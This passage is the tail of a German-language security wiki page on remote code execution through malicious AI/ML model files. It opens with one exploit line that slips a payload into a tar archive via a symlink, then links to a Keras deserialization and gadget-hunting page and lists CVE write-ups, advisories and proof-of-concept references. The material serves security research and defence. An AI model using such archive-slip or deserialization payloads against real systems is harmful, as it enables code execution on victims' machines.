    tf.add(PAYLOAD)                      # rides the symlink
```

### Vertiefung: Keras-.keras-Deserialisierung und Gadget-Suche

Eine gezielte Anleitung zu den Interna von .keras, RCE über Lambda-Layer, dem Problem des beliebigen Imports in ≤ 3.8 und der Gadget-Suche innerhalb der Allowlist nach dem Fix findest du hier:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-Blog – „CVE-2024-12029 – InvokeAI: Deserialisierung nicht vertrauenswürdiger Daten“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentation des Rapid7-Metasploit-Moduls](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitshinweise für torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-Blog – CVE-2025-23298: Remote Code Execution in NVIDIA Merlin erreichen](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Sicherheitshinweis: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen bösartigen Checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution in modernen KI/ML-Formaten und -Bibliotheken](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-Dokumentation zu instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Blocklist-Commit (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: LangGraphs Checkpointer ausnutzen](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Bugs für hochwertige KI/ML-Bounties nutzen](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-Sicherheitshinweis und PyFunc-Proof-of-Concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-Quellcode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow-REST-API – Endpunkte zum Herunter- und Hochladen von Artefakten](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer: Taxonomie zur Umgehung statischer Scanner](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – Erkennung bösartiger Modelle mit MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch-Implementierung von Storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython-Pickle-Kompatibilitätszuordnung für `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython-Importzuordnung in `_compat_pickle`](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
